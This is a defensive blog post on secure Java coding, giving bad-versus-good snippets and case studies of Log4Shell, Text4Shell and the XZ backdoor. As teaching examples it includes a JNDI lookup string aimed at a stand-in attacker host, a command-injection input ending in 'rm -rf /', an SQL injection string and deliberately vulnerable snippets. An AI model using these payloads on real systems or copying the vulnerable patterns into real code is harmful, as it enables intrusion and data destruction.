@@ -1,0 +1,321 @@
+---
+title: "Secure Coding Guidelines for Java — What I Learned and Why It Matters"
+description: "A walkthrough of secure coding practices for Java covering the full SDLC — from design to deployment. Includes real-world vulnerability case studies (Log4Shell, OGNL injection, Text4Shell, XZ Utils backdoor), code examples for input validation, SQL injection prevention, deserialization filtering, and practical takeaways for backend engineers."
+pubDate: "2026-04-12"
+tags:
+  [
+    "Java",
+    "Security",
+    "Backend",
+    "Secure Coding",
+    "Software Engineering",
+  ]
+heroImage: ""
+language: "en"
+---
+
+## Overview
+
+Security vulnerabilities are expensive. The cost isn't just in engineering hours to patch — it's the intermediate response (incident management, migration, detection), and the damage to reputation that follows. The earlier we catch vulnerabilities in the SDLC, the cheaper they are to fix.
+
+I've been digging into secure coding practices for Java, and this post is a summary of what I've learned — covering the types of vulnerabilities, where they come from, how to address them at each phase of the SDLC, and real-world cases that show why this matters.
+
+---
+
+## What is a Vulnerability?
+
+A vulnerability is a flaw or weakness in a system that could be exploited to violate its security policy. They can come from multiple sources:
+
+- **Design/Architecture** — faulty assumptions, missing security mechanisms
+- **Implementation** — insecure programming practices
+- **Integration/Test** — configuration errors, vulnerable third-party code
+- **Deployment/Release** — missing patches, exposed endpoints
+
+The cost of a vulnerability goes beyond the fix itself:
+
+1. **Remediation** — time and resources to fix, rebuild, and release
+2. **Intermediate response** — mitigation, detection, incident response
+3. **Reputation damage** — PR fallout, legal liability, loss of customer trust
+
+---
+
+## Secure Coding Across the SDLC
+
+Security shouldn't be an afterthought bolted on at the end. Each phase of the SDLC has its own set of practices:
+
+### Design/Architecture
+- Security training for the team
+- Threat modeling — systematically identify what can go wrong
+- Misuse cases — think about how an attacker would use the system, not just the happy path
+
+### Implementation
+- Manual code review with security focus
+- Static analysis tools (SpotBugs, SonarQube, Semgrep)
+- Follow secure coding guidelines
+
+### Integration/Test
+- Dependency checkers (OWASP Dependency-Check, Snyk)
+- Static analysis on the full codebase
+- Runtime testing and negative testing — test what the system should reject, not just what it should accept
+
+### Deployment/Release
+- Vulnerability scanning
+- Runtime monitoring (e.g., WAFs)
+- Dependency patching
+- Vulnerability remediation processes
+
+---
+
+## Oracle's Secure Coding Guidelines for Java SE
+
+Oracle maintains a set of [Secure Coding Guidelines for Java SE](https://www.oracle.com/java/technologies/javase/seccodeguide.html) that covers both general and Java-specific practices. It's not meant to be comprehensive or a tutorial — it's a living reference that gets updated as new problems surface and new security features land (like JEP 486 to permanently disable the Security Manager).
+
+Here are the key areas I found most relevant:
+
+### 1. Input Validation
+
+Never trust input from external sources. Validate type, length, range, and format. Prefer allowlists over denylists.
+
+```java
+// Bad — denylist approach, easy to bypass
+public boolean isValidUsername(String input) {
+    // Attacker can always find characters not in the denylist
+    String[] blocked = {"<", ">", ";", "'"};
+    for (String c : blocked) {
+        if (input.contains(c)) return false;
+    }
+    return true;
+}
+
+// Good — allowlist approach, only permit known safe patterns
+public boolean isValidUsername(String input) {
+    // Only allow alphanumeric and underscore, 3-20 chars
+    return input != null && input.matches("^[a-zA-Z0-9_]{3,20}$");
+}
+```
+
+Also normalize data before validation — attackers can use Unicode normalization tricks or path traversal to bypass checks:
+
+```java
+// Normalize path before validation to prevent traversal
+import java.nio.file.Path;
+import java.nio.file.Paths;
+
+public Path resolveSafePath(String userInput, Path baseDir) {
+    Path resolved = baseDir.resolve(userInput).normalize();
+
+    // Verify the resolved path is still within the base directory
+    if (!resolved.startsWith(baseDir)) {
+        throw new SecurityException("Path traversal detected: " + userInput);
+    }
+    return resolved;
+}
+```
+
+### 2. Injection and Inclusion
+
+This is the category behind most of the high-profile vulnerabilities. The core problem: treating untrusted data as executable instructions.
+
+**SQL Injection:**
+
+```java
+// Bad — string concatenation, vulnerable to SQL injection
+public User findUser(String username) {
+    String query = "SELECT * FROM users WHERE name = '" + username + "'";
+    // Attacker input: ' OR '1'='1 → returns all users
+    return jdbcTemplate.queryForObject(query, userRowMapper);
+}
+
+// Good — parameterized query, input is treated as data, not code
+public User findUser(String username) {
+    String query = "SELECT * FROM users WHERE name = ?";
+    return jdbcTemplate.queryForObject(query, userRowMapper, username);
+}
+```
+
+**OS Command Injection:**
+
+```java
+// Bad — passing user input directly to shell
+public void convertFile(String filename) {
+    // Attacker input: "file.txt; rm -rf /" → executes destructive command
+    Runtime.getRuntime().exec("convert " + filename);
+}
+
+// Good — use ProcessBuilder with argument list, no shell interpretation
+public void convertFile(String filename) {
+    ProcessBuilder pb = new ProcessBuilder("convert", filename);
+    pb.start();
+}
+```
+
+**XML External Entity (XXE) Prevention:**
+
+```java
+// Good — disable external entities to prevent XXE attacks
+import javax.xml.parsers.DocumentBuilderFactory;
+
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+// Disable external entities and DTDs entirely
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+```
+
+### 3. Serialization and Deserialization
+
+Java's native serialization has been a recurring source of critical vulnerabilities. The guideline is straightforward: **avoid Java serialization where possible**. Use JSON, Protocol Buffers, or other safe formats instead.
+
+If you must use serialization, use `ObjectInputFilter` (introduced via JEP 290) to restrict what classes can be deserialized:
+
+```java
+import java.io.ObjectInputFilter;
+import java.io.ObjectInputStream;
+import java.io.ByteArrayInputStream;
+
+public Object deserializeSafely(byte[] data) throws Exception {
+    ByteArrayInputStream bis = new ByteArrayInputStream(data);
+    ObjectInputStream ois = new ObjectInputStream(bis);
+
+    // Only allow specific classes to be deserialized
+    ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
+        "com.myapp.dto.*;!*"  // Allow only classes in com.myapp.dto, reject everything else
+    );
+    ois.setObjectInputFilter(filter);
+
+    return ois.readObject();
+}
+```
+
+The `!*` at the end is important — it means "reject everything not explicitly allowed." Without it, any class could still be deserialized.
+
+### 4. Mutability and Defensive Copies
+
+Don't expose internal mutable state. Return defensive copies to prevent callers from modifying your object's internals:
+
+```java
+// Bad — exposes internal mutable list
+public class UserRoles {
+    private final List<String> roles;
+
+    public UserRoles(List<String> roles) {
+        this.roles = roles;  // Caller can still modify the original list
+    }
+
+    public List<String> getRoles() {
+        return roles;  // Caller can modify internals via this reference
+    }
+}
+
+// Good — defensive copies on input and output
+public class UserRoles {
+    private final List<String> roles;
+
+    public UserRoles(List<String> roles) {
+        this.roles = List.copyOf(roles);  // Immutable copy on construction
+    }
+
+    public List<String> getRoles() {
+        return Collections.unmodifiableList(roles);  // Unmodifiable view on access
+    }
+}
+```
+
+### 5. Accessibility and Extensibility
+
+Limit the attack surface by minimizing what's accessible:
+
+```java
+// Prefer final classes to prevent malicious subclassing
+public final class SecurityConfig {
+    // Mark fields private, methods private where possible
+    private final String secretKey;
+
+    // Package-private constructor — only accessible within the same package
+    SecurityConfig(String secretKey) {
+        this.secretKey = secretKey;
+    }
+}
+```
+
+### 6. JEP 486: Security Manager Removal
+
+The Security Manager has been deprecated for removal (JEP 486, finalized in JDK 24). The guidelines now recommend:
+- Do not rely on `SecurityManager` for sandboxing
+- Use OS-level isolation (containers, process-level sandboxing) instead
+- Refactor code that uses `AccessController.doPrivileged`
+
+---
+
+## Real-World Vulnerability Case Studies
+
+These cases illustrate why secure coding guidelines exist. Each one maps directly back to a guideline violation.
+
+### Log4Shell — CVE-2021-44228 (December 2021)
+
+Apache Log4j 2.x supported JNDI lookups in log message format strings. An attacker could inject `${jndi:ldap://attacker.com/exploit}` into any logged input — HTTP headers, form fields, user agents. Log4j would resolve this via JNDI, connecting to the attacker's LDAP server, which could return a serialized Java object achieving remote code execution.
+
+**Guideline violated**: Injection/Inclusion — user input was interpreted as a format expression. A logging library had no business resolving JNDI lookups from logged data.
+
+### Confluence OGNL Injection — CVE-2021-26084 (August 2021)
+
+Atlassian Confluence Server allowed unauthenticated OGNL expression injection. OGNL is a Java expression language, and crafted HTTP requests to certain endpoints could inject arbitrary expressions that executed Java code on the server.
+
+**Guideline violated**: Injection/Inclusion — untrusted input was passed directly to an expression language evaluator without sanitization or sandboxing.
+
+### Cobalt Strike XSS (2022)
+
+Cobalt Strike, a red team simulation tool, had an XSS vulnerability in its client. The client uses Swing, which renders HTML — so attacker-controlled HTML could be injected and rendered in the UI.
+
+**Guideline violated**: Input Validation — untrusted data rendered as HTML in a Swing component without escaping.
+
+### Text4Shell — CVE-2022-42889 (October 2022)
+
+Apache Commons Text's `StringSubstitutor` supported interpolation prefixes like `${script:...}`, `${dns:...}`, and `${url:...}`. If user-controlled input was passed through `StringSubstitutor.replace()`, attackers could trigger script execution or DNS lookups.
+
+Same class of flaw as Log4Shell — treating data as code through string interpolation.
+
+**Guideline violated**: Injection/Inclusion — string interpolation on untrusted input.
+
+### XZ Utils Backdoor — CVE-2024-3094 (March 2024)
+
+A supply chain attack where a malicious maintainer spent ~2 years gaining trust as an xz-utils contributor, then inserted a backdoor into the build process. Obfuscated binary test files were committed, and a modified `configure` script extracted malicious code into `liblzma`. This code hooked into `sshd` (via systemd's dependency on lzma), intercepting RSA key verification to allow unauthorized remote access.
+
+Discovered by Andres Freund who noticed SSH latency anomalies.
+
+**Lesson**: Supply chain security — code review of build scripts and binary test fixtures, reproducible builds, limiting trust in single maintainers.
+
+### Deserialization Vulnerabilities — 2025
+
+SAP NetWeaver (CVE-2025-31324), Cisco Unified Contact Center, NetIQ, SolarWinds — all hit by deserialization vulnerabilities in 2025. The SAP case was particularly severe (CVSS 10.0): an unauthenticated endpoint accepted serialized Java objects without filtering, leading to remote code execution.
+
+**Guideline violated**: Serialization/Deserialization — no `ObjectInputFilter`, no authentication on endpoints accepting serialized data.
+
+### npm Packages Compromise (2025)
+
+Phishing attacks targeting npm package maintainers, leading to compromised packages in the ecosystem.
+
+**Lesson**: Dependency management and supply chain security. Verify package integrity, use lockfiles, audit dependencies regularly.
+
+---
+
+## Common Pattern Across All Cases
+
+Most of these vulnerabilities share a root cause: **untrusted input treated as executable instructions**. Whether it's JNDI lookups in log messages, OGNL expressions in HTTP parameters, string interpolation with script prefixes, or deserialized Java objects — the pattern is the same.
+
+The fix is also consistent:
+1. **Validate input** — allowlist, not denylist
+2. **Separate data from code** — parameterized queries, safe APIs, avoid expression evaluation on user input
+3. **Filter deserialization** — use `ObjectInputFilter` or avoid Java serialization entirely
+4. **Manage dependencies** — audit, patch, verify integrity
+5. **Monitor in production** — WAFs, vulnerability scanning, anomaly detection
+
+---
+
+## Takeaways
+
+1. Apply secure coding practices to eliminate and minimize the impact of vulnerabilities
+2. Consider security throughout the SDLC — not just at the implementation phase
+3. Follow the [Secure Coding Guidelines for Java SE](https://www.oracle.com/java/technologies/javase/seccodeguide.html) as a living reference
+4. Keep dependencies updated and audit them regularly
+5. The cost of prevention is always lower than the cost of remediation
